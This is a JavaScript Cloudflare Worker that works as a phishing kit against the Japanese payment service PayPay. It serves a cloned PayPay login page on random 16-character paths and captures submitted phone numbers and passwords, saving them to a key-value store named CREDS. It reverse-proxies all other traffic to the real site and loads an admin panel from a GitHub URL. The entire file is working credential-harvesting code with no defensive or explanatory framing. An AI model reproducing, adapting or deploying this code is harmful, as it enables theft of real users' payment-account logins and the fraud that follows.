// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// /admin で管理画面
// 16文字IDパスは静的ログインフォームを配信（実際のHTML構造に基づく）
// 送信時に credential を KV に保存

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";

const LOGIN_HTML = `<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>PayPay</title>
  <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif; background: #fff; color: #242424; }
    .header { display: flex; align-items: center; padding: 16px; border-bottom: 1px solid #eee; }
    .header img { height: 32px; }
    .header h2 { margin-left: 12px; font-size: 18px; font-weight: 600; }
    .content { padding: 24px 16px; max-width: 400px; margin: 0 auto; }
    .content h3 { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
    .field { margin-bottom: 16px; }
    .field label { display: block; font-size: 12px; color: #666; margin-bottom: 4px; }
    .field input { width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
    .field input:focus { border-color: #3895ff; }
    .forgot { font-size: 13px; margin-bottom: 20px; }
    .forgot a { color: #3895ff; text-decoration: none; }
    .submit { width: 100%; padding: 14px; font-size: 16px; font-weight: 600; color: #fff; background: #3895ff; border: none; border-radius: 8px; cursor: pointer; }
    .submit:disabled { background: #ccc; }
    .msg { margin-top: 12px; font-size: 13px; text-align: center; }
    .msg.ok { color: #48bb78; }
    .msg.err { color: #e53e3e; }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay">
    <h2>ログイン</h2>
  </div>
  <div class="content">
    <h3>PayPayに登録した携帯電話番号でログイン</h3>
    <form id="loginForm">
      <div class="field">
        <label for="username">携帯電話番号</label>
        <input type="tel" id="username" name="username" placeholder="携帯電話番号" maxlength="13" required>
      </div>
      <div class="field">
        <label for="password">パスワード</label>
        <input type="password" id="password" name="password" placeholder="パスワード" required>
      </div>
      <div class="forgot"><a href="#">パスワードをお忘れですか？</a></div>
      <button type="submit" id="loginBtn" class="submit">ログイン</button>
    </form>
    <div class="msg" id="msg"></div>
  </div>
  <script>
    document.getElementById('loginForm').onsubmit = async function(e) {
      e.preventDefault();
      var btn = document.getElementById('loginBtn');
      var msg = document.getElementById('msg');
      btn.disabled = true;
      msg.textContent = '';
      msg.className = 'msg';
      try {
        var res = await fetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
          }),
        });
        if (res.ok) {
          msg.textContent = 'ログインしました';
          msg.className = 'msg ok';
        } else {
          msg.textContent = 'エラーが発生しました';
          msg.className = 'msg err';
          btn.disabled = false;
        }
      } catch {
        msg.textContent = '通信エラー';
        msg.className = 'msg err';
        btn.disabled = false;
      }
    };
  </script>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      try {
        const adminRes = await fetch(ADMIN_SOURCE);
        if (adminRes.ok) {
          return new Response(await adminRes.text(), {
            headers: { "Content-Type": "text/html; charset=utf-8" },
          });
        }
      } catch {}
      return new Response("Admin HTML fetch failed", { status: 502 });
    }

    if (url.pathname === "/api/capture" && request.method === "POST") {
      let body = {};
      try { body = await request.json(); } catch {}
      const captured = {
        type: "login_form",
        username: body.username || null,
        password: body.password || null,
        ts: new Date().toISOString(),
        ua: request.headers.get("User-Agent") || "",
      };
      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));
      return json({ ok: true });
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      return new Response(LOGIN_HTML, {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    return proxy(request, env, workerHost);
  },
};

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? request.body : undefined,
    redirect: "follow",
  });

  return new Response(res.body, { status: res.status, headers: res.headers });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
